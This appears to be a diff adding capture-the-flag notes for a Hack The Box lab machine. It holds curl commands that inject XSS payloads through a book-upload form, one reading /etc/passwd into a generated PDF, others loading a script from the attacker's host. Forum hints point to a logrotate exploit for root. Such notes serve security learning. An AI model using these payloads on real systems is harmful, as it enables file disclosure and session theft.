@@ -1,0 +1,25 @@
+curl 'http://10.10.10.176/collections.php' -X POST -F "Upload=@~/htb/book/4.pdf" -F 'title=Corpse Flower' -F "author=%3Cscript%3Ex%3Dnew%20XMLHttpRequest%3Bx%2Eonload%3Dfunction%28%29%7Bdocument%2Ewrite%28this%2EresponseText%29%7D%3Bx%2Eopen%28%27GET%27%2C%27file%3A%2F%2F%2Fetc%2Fpasswd%27%29%3Bx%2Esend%28%29%3B%3C%2Fscript%3E" -H 'Cookie: PHPSESSID=r0hu3tpi52rg8tr8doi3i56cud' --compressed --insecure
+
+curl 'http://10.10.10.176/admin/collections.php?type=collections' -H 'Cookie: PHPSESSID=tj3vj7ksnlrhsncho22ec6hak4' --compressed --insecure
+
+<script>document.write(window.location)</script>
+
+<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
+
+<img src=x onerror=document.write(window.location)>
+
+curl -v 'http://10.10.10.176/collections.php' -X POST -F "Upload=@notes.txt" -F "title=Corpse Flower" -F "author=<script>document.write(window.location)</script>" -H 'Cookie: PHPSESSID=r0hu3tpi52rg8tr8doi3i56cud' --compressed --insecure
+
+<script src="http://10.10.14.6:8888/book/admin.js"></script>
+
+<img src=x onerror=document.write('a')><script src="http://10.10.14.6:8888/book/admin.js"></script>
+
+-----------------------------------------------------------------------------
+Root:
+Spies everywhere. Catch and Interrogate a spy and let him speak from what he saw. Then after that, repay his SERVICE.
+Root: As it is told by some people in this topic, there is a vulnerable service you can easily find by performing a standard enumeration. This vulnerability is well-documented and the exploitation is really easy, if you read the details.
+
+Could anyone give me a nudge on how to exploit the lo....... rc?
+                                                   logrotate rc
+
+If you google for that word plus exploit github the best link is likely to be in the top 5
